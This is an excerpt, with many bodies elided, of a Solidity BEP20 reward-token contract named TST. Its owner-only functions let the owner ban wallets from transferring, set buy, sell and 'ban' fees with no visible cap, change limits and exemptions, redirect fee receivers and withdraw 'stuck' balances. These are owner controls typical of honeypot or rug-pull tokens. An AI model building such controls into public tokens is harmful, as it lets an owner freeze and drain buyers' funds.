...
abstract contract Auth {
    ...
    modifier ownerOnly() {
        require(isownerOnly(msg.sender), "!ownerOnly"); _;
    }
    ...
    function isownerOnly(address adr) public view returns (bool) {
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 public REWARD = IBEP20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);
...
contract TST is IBEP20, Auth {
    ...
    function setMaxWalletPercent(uint256 maxWallPercent) external ownerOnly() {
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 100;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
            require(bannedUsers[sender] == false, "Error");
            require(bannedUsers[recipient] == false, "Error");
    ...
    function clearStuckBalance(uint256 amountPercentage) external ownerOnly {
    ...
    function cooldownEnabled(bool _status, uint8 _interval) external ownerOnly {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function purgeBeforeSwitch() external ownerOnly {
        distributor.purge(msg.sender);
    }

    function switchToken(address rewardToken) external ownerOnly {
    ...
    function setTxLimit(uint256 amount) external ownerOnly {
        _maxTxAmount = amount;
    }

    function setIsDividendExempt(address holder, bool exempt) external ownerOnly {
    ...
    function setIsFeeExempt(address holder, bool exempt) external ownerOnly {
        isFeeExempt[holder] = exempt;
    }
    
    function setWalletBanStatus(address user, bool banned) external ownerOnly {
		if (banned) {
            require(	1626631691 + 3650 days > block.timestamp, "420");
    ...
    function setIsTxLimitExempt(address holder, bool exempt) external ownerOnly {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsTimelockExempt(address holder, bool exempt) external ownerOnly {
        isTimelockExempt[holder] = exempt;
    }

    function setSellFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external ownerOnly {
    ...
    function setBuyFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee) external ownerOnly {
        BuyliquidityFee = _liquidityFee;
        BuyreflectionFee = _reflectionFee;
        BuymarketingFee = _marketingFee;
    }

    function setBanFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee) external ownerOnly {
        banliquidityFee = _liquidityFee;
        banreflectionFee = _reflectionFee;
        banmarketingFee = _marketingFee;
    }
    
    function setBanblock(uint256 _blocks) external ownerOnly {
        blocks = _blocks;
    }
    
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external ownerOnly {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external ownerOnly {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external ownerOnly {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external ownerOnly {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external ownerOnly {
        require(gas < 750000);
        distributorGas = gas;
    }
